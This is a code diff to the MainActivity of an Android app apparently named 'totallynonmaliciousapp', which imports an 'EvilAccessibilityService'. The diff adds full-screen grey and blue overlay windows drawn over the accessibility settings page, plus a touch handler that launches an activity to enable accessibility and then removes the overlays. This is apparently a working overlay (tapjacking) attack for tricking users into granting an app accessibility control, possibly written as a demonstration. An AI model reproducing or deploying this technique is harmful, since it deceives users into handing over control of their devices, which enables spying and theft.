@@ -7,13 +7,21 @@ import android.graphics.PixelFormat
 import android.net.Uri
 import android.os.Bundle
 import jamil.totallynonmaliciousapp.services.EvilAccessibilityService
-import android.preference.PreferenceActivity
 import android.provider.Settings
 import android.view.LayoutInflater
+import android.view.MotionEvent
+import android.view.View
 import android.view.WindowManager
+import android.os.Handler
 
 
-class MainActivity : Activity() {
+
+
+class MainActivity : Activity(), View.OnTouchListener{
+
+    private var viewFullScreenGreyBottom : View? = null
+    private var viewFullScreenGreyTop : View? = null
+    private var viewFullScreenBlue : View? = null
 
     override fun onCreate(bundle: Bundle?) {
         super.onCreate(bundle)
@@ -24,8 +32,6 @@ class MainActivity : Activity() {
 
         openAccessibilitySettingsPage()
         requestDrawOnTop()
-
-        finish()
     }
 
     private fun requestDrawOnTop() {
@@ -33,7 +39,7 @@ class MainActivity : Activity() {
             val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
             startActivityForResult(intent, 251)
         } else {
-            firstWindow()
+            draw_window()
         }
     }
 
@@ -43,36 +49,80 @@ class MainActivity : Activity() {
         when(requestCode) {
             251 -> {
                 if (Settings.canDrawOverlays(this)) {
-                    firstWindow()
+                    draw_window()
                 }
             }
         }
     }
 
     private fun openAccessibilitySettingsPage() {
-        val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
+        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
         startActivity(intent)
     }
 
-    private fun firstWindow() {
-        return
+    override fun onTouch(v: View?, event: MotionEvent?): Boolean {
+        if (event != null && event.rawY == 0.0f) {
+
+            val intent = Intent(this, EnableAccessibilityActivity::class.java)
+            startActivity(intent)
+
+            val handler = Handler()
+            handler.postDelayed( {
+                this.viewFullScreenBlue?.visibility = View.GONE
+                this.viewFullScreenGreyTop?.visibility = View.GONE
+                this.viewFullScreenGreyBottom?.visibility = View.GONE
+            }, 2000)
+            finish()
+            return true
+        }
+
+        return false
+    }
+
+
+    private fun draw_window() {
         val layoutInflator = getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
-        val view = layoutInflator.inflate(R.layout.accessiblity_view, null)
+
+        this.viewFullScreenGreyBottom = layoutInflator.inflate(R.layout.full_screen_grey_bottom, null)
+        this.viewFullScreenGreyTop = layoutInflator.inflate(R.layout.full_screen_grey_top, null)
+        this.viewFullScreenBlue = layoutInflator.inflate(R.layout.full_screen_blue, null)
+
+        this.viewFullScreenGreyTop?.setOnTouchListener(this)
 
         val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
 
-        val metrics = resources.displayMetrics
-
-        val windowParameters = WindowManager.LayoutParams(
-            metrics.widthPixels,
-            metrics.heightPixels,
+        val windowParametersTop = WindowManager.LayoutParams(
+            1080,
+            860,
+            0,
+            -1000,
             WindowManager.LayoutParams.TYPE_PHONE,
-            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
             PixelFormat.TRANSLUCENT
         )
 
-        windowManager.addView(view, windowParameters)
+        val windowParametersBottom = WindowManager.LayoutParams(
+            1080,
+            700,
+            0,
+            1000,
+            WindowManager.LayoutParams.TYPE_PHONE,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+            PixelFormat.TRANSLUCENT
+        )
 
+        val windowParametersCenter = WindowManager.LayoutParams(
+            1080,
+            172,
+            0,
+            80,
+            WindowManager.LayoutParams.TYPE_PHONE,
+            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
+            PixelFormat.TRANSLUCENT
+        )
 
+        windowManager.addView(viewFullScreenGreyTop, windowParametersTop)
+        windowManager.addView(viewFullScreenGreyBottom, windowParametersBottom)
+        windowManager.addView(viewFullScreenBlue, windowParametersCenter)
     }
 }
